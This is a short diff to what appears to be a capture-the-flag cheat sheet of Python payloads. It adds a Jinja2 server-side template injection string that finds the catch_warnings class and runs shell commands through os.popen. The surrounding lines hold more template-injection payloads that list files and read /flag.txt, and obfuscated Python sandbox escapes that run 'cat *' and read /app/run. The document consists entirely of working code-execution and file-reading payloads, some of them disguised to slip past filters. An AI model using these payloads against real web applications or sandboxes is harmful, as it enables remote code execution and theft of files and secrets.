@@ -17,6 +17,10 @@
  {{ url_for.__globals__.os.popen("ls").read() }}
  {{ self.__init__.__globals__.__builtins__.open("/flag.txt").read() }}
 
+
+#find catch_warning index automatically
+{{ ("foo".__class__.__base__.__subclasses__()|selectattr("__name__","equalto","catch_warnings")|first).__init__.__globals__['sys'].modules['os'].popen("ls").read() }}
+
 # those were for pyjails with some checks
 1 and {}.__class__.__mro__[1].__subclasses__()[203].__init__.__globals__['sys'].modules['so'[::-1]].𝓼𝔂𝓼𝓽𝓮𝓶('cat *')
 0+(a:=().__class__.__base__.__subclasses__()[151].__len__.__globals__["__b"+"uiltins__"],a["print"](a["op""en"]("/app/run").read()))
